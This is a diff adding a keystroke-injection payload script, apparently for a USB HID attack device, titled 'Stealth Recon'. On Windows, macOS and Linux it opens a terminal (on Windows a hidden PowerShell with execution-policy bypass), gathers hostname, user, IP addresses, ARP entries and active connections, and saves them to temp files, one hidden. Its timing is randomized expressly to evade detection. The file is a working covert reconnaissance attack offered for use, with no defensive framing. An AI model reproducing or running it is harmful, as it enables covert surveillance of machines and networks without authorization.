@@ -1,0 +1,62 @@
+NAME Stealth Recon
+DESCRIPTION Slow stealthy recon with randomized timing to evade detection
+CATEGORY recon
+PLATFORMS WIN,MAC,LINUX
+OPTION DELAY 3000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+JITTER 500 2000
+STRING powershell -nop -ep bypass -w hidden
+ENTER
+JITTER 1000 3000
+LED_COLOR BLUE
+STRINGLN $h = hostname; $u = whoami
+JITTER 500 1500
+STRINGLN $ip = (ipconfig | sls 'IPv4').ToString().Split(':')[1].Trim()
+JITTER 500 1500
+STRINGLN $arp = arp -a | Out-String
+JITTER 500 1500
+STRINGLN $conn = netstat -an | sls 'ESTABLISHED' | Select -First 10 | Out-String
+JITTER 500 1500
+STRINGLN "HOST:$h USER:$u IP:$ip`n=ARP=`n$arp`n=CONN=`n$conn" | Out-File $env:TEMP\r.log
+ENTER
+LED_COLOR GREEN
+JITTER 500 1000
+STRING exit
+ENTER
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+JITTER 500 1500
+STRING Terminal
+ENTER
+JITTER 1000 3000
+LED_COLOR BLUE
+STRINGLN echo "HOST:$(hostname) USER:$(whoami)" > /tmp/.r.log
+JITTER 500 1500
+STRINGLN ifconfig | grep 'inet ' >> /tmp/.r.log
+JITTER 500 1500
+STRINGLN arp -a >> /tmp/.r.log
+JITTER 500 1500
+STRINGLN netstat -an | grep ESTABLISHED | head -10 >> /tmp/.r.log
+JITTER 500 1000
+LED_COLOR GREEN
+STRING exit
+ENTER
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+JITTER 1000 3000
+LED_COLOR BLUE
+STRINGLN echo "HOST:$(hostname) USER:$(whoami)" > /tmp/.r.log
+JITTER 500 1500
+STRINGLN ip addr | grep 'inet ' >> /tmp/.r.log
+JITTER 500 1500
+STRINGLN arp -a >> /tmp/.r.log 2>/dev/null
+JITTER 500 1500
+STRINGLN ss -tunp | head -10 >> /tmp/.r.log
+JITTER 500 1000
+LED_COLOR GREEN
+STRING exit
+ENTER
